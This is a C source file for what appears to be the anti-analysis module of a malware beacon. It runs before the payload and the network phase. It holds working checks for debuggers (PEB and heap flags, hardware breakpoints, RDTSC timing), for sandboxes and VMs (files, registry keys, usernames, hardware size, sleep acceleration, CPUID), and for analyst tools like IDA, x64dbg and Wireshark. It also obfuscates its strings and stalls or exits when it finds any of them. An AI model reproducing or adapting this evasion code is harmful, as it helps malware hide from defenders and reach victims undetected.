/**
 * anti_analysis.c - Anti-Debug and Anti-Sandbox Module
 *
 * Detects analysis environments before executing payload:
 * - Debugger detection (multiple methods)
 * - Sandbox detection (timing, artifacts, hardware)
 * - VM detection (hypervisor artifacts)
 * - Analyst tool detection (process list)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include "../../include/obfuscate.h"
#include "../../include/evasion.h"

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
} PEB, *PPEB;

void anti_analysis_evade(int detection_code);

extern volatile BOOL g_hwbp_installed;

/* ---- Debugger Detection ---- */

BOOL check_debugger_present(void) {
    return IsDebuggerPresent() ? TRUE : FALSE;
}

int check_remote_debugger(void) {
    BOOL present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &present);
    return present;
}

int check_ntglobalflag(void) {
    // PEB->NtGlobalFlag contains 0x70 when debugged
    // (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
    DWORD flags = *(DWORD*)((BYTE*)peb + 0xBC);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
    DWORD flags = *(DWORD*)((BYTE*)peb + 0x68);
#endif
    return (flags & 0x70) != 0;
}

int check_heap_flags(void) {
    // Process heap flags differ under debugger
#ifdef _WIN64
    PVOID heap = (PVOID)*(UINT64*)((BYTE*)__readgsqword(0x60) + 0x30);
    DWORD flags = *(DWORD*)((BYTE*)heap + 0x70);
    DWORD force_flags = *(DWORD*)((BYTE*)heap + 0x74);
#else
    PVOID heap = (PVOID)*(DWORD*)((BYTE*)__readfsdword(0x30) + 0x18);
    DWORD flags = *(DWORD*)((BYTE*)heap + 0x40);
    DWORD force_flags = *(DWORD*)((BYTE*)heap + 0x44);
#endif
    return (flags & ~2) != 0 || force_flags != 0;
}

int check_hardware_breakpoints(void) {
    if (g_hwbp_installed)
        return 0; /* Our own HWBPs, not a debugger */

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx)) return 0;
    return (ctx.Dr0 | ctx.Dr1 | ctx.Dr2 | ctx.Dr3) != 0;
}

int check_timing_rdtsc(void) {
    // RDTSC-based timing check - debugger single-stepping adds latency
    unsigned __int64 t1 = __rdtsc();
    // Some operations
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
    unsigned __int64 t2 = __rdtsc();

    // Normal execution: < 10000 cycles. Debugger: >> 10000
    return (t2 - t1) > 100000;
}

/* ---- Sandbox Detection ---- */

BOOL check_sandbox_artifacts(void) {
    if (GetFileAttributesA(OBF("C:\\agent\\agent.pyw")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\sandbox\\")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\analysis\\")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\iDEFENSE\\")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\insidetm\\")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\windows\\system32\\drivers\\VBoxMouse.sys")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA(OBF("C:\\windows\\system32\\drivers\\vmhgfs.sys")) != INVALID_FILE_ATTRIBUTES) return TRUE;
    return FALSE;
}

int check_sandbox_registry(void) {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SOFTWARE\\Oracle\\VirtualBox Guest Additions"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SYSTEM\\ControlSet001\\Services\\VBoxGuest"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SYSTEM\\ControlSet001\\Services\\vmci"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("HARDWARE\\ACPI\\DSDT\\VBOX__"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 1;
    }
    return 0;
}

int check_sandbox_processes(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    int found = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, OBF("procmon.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("procmon64.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("procexp.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("procexp64.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("wireshark.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("dumpcap.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("x64dbg.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("x32dbg.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("ollydbg.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("windbg.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("ida.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("ida64.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("ghidra.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("pestudio.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("fiddler.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("regmon.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("filemon.exe")) == 0) {
                found = 1;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return found;
}

int check_sandbox_hardware(void) {
    // Check RAM (sandboxes often have < 4GB)
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (DWORDLONG)4 * 1024 * 1024 * 1024) {
        return 1;
    }

    // Check CPU count (sandboxes often have 1-2)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return 1;
    }

    // Check disk size via GetDiskFreeSpaceEx (< 60GB is suspicious)
    ULARGE_INTEGER total;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &total, NULL)) {
        if (total.QuadPart < (ULONGLONG)60 * 1024 * 1024 * 1024) {
            return 1;
        }
    }

    return 0;
}

int check_sandbox_timing(void) {
    // Sleep acceleration detection
    DWORD start = GetTickCount();
    Sleep(1000);
    DWORD elapsed = GetTickCount() - start;

    // If sleep was accelerated (< 900ms actual), we're in a sandbox
    if (elapsed < 900) return 1;

    return 0;
}

int check_sandbox_username(void) {
    char username[256];
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size)) return 0;

    if (_stricmp(username, OBF("sandbox")) == 0 ||
        _stricmp(username, OBF("malware")) == 0 ||
        _stricmp(username, OBF("virus")) == 0 ||
        _stricmp(username, OBF("sample")) == 0 ||
        _stricmp(username, OBF("test")) == 0 ||
        _stricmp(username, OBF("user")) == 0 ||
        _stricmp(username, OBF("admin")) == 0 ||
        _stricmp(username, OBF("currentuser")) == 0 ||
        _stricmp(username, OBF("john")) == 0 ||
        _stricmp(username, OBF("emily")) == 0 ||
        _stricmp(username, OBF("hongkong")) == 0) {
        return 1;
    }
    return 0;
}

/* ---- CPUID-based VM Detection ---- */
int check_hypervisor_cpuid(void) {
    int cpuid_result[4] = {0};
    __cpuid(cpuid_result, 1);
    // Bit 31 of ECX indicates hypervisor present
    return (cpuid_result[2] >> 31) & 1;
}

/* ---- Composite Check ---- */
int anti_analysis_check_all(void) {
    // Returns non-zero if ANY analysis indicator is found
    if (check_debugger_present()) return 1;
    if (check_remote_debugger()) return 2;
    if (check_ntglobalflag()) return 3;
    if (check_hardware_breakpoints()) return 4;
    if (check_timing_rdtsc()) return 5;
    if (check_sandbox_artifacts()) return 6;
    if (check_sandbox_processes()) return 7;
    if (check_sandbox_hardware()) return 8;
    if (check_sandbox_timing()) return 9;
    if (check_hypervisor_cpuid()) return 10;
    return 0;
}

/* ---- Init (called from beacon before network) ---- */
void anti_analysis_init(void) {
    int code = 0;
    if (check_debugger_present()) code = 1;
    else if (check_remote_debugger()) code = 2;
    else if (check_ntglobalflag()) code = 3;
    else if (check_heap_flags()) code = 4;
    else if (check_hardware_breakpoints()) code = 5;
    else if (check_timing_rdtsc()) code = 6;
    else if (check_sandbox_artifacts()) code = 7;
    else if (check_sandbox_registry()) code = 8;
    else if (check_sandbox_username()) code = 9;
    else if (check_sandbox_processes()) code = 10;
    else if (check_sandbox_hardware()) code = 11;
    else if (check_sandbox_timing()) code = 12;
    else if (check_hypervisor_cpuid()) code = 13;
    anti_analysis_evade(code);
}

/* ---- Evasive Response ---- */
void anti_analysis_evade(int detection_code) {
    switch (detection_code) {
        case 0:
            break;
        case 1: case 2: case 3: case 4: case 5: case 6:
            // Debugger detected (PEB, heap, HWBP, timing) - enter infinite sleep
            while (1) Sleep(60000);
            break;
        case 7: case 8: case 9: case 10: case 11: case 12: case 13:
            // Sandbox/VM detected (artifacts, registry, username, processes, hw, timing, cpuid)
            ExitProcess(0);
            break;
    }
}
